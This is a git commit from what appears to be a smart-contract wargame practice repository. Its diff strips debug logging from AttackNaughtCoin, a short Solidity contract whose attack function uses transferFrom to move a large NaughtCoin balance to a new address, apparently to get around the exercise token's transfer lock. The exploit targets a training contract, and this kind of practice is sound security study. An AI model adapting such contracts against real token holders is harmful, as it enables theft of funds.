668c77b26002fe124258214dffd5710710a7d4d3
tashun <tashun.chamara@gmail.com>
2022-10-09 22:18:53 +0530

    attack denial

--- contracts/Attacks/Stage1/17/AttackRecovery.sol
+++ contracts/Attacks/Stage1/17/AttackRecovery.sol
@@ -1,6 +1,5 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
-import "hardhat/console.sol";
 import "../../../Exercise/Stage1/15/NaughtCoin.sol";
 contract AttackNaughtCoin {
     NaughtCoin private naughtCoin;
@@ -9,7 +8,6 @@ contract AttackNaughtCoin {
     }
 
     function attack(address newOwner) external {
-        console.log(msg.sender);
         naughtCoin.transferFrom(msg.sender, newOwner ,1000000000000000000000000);
     }
 }
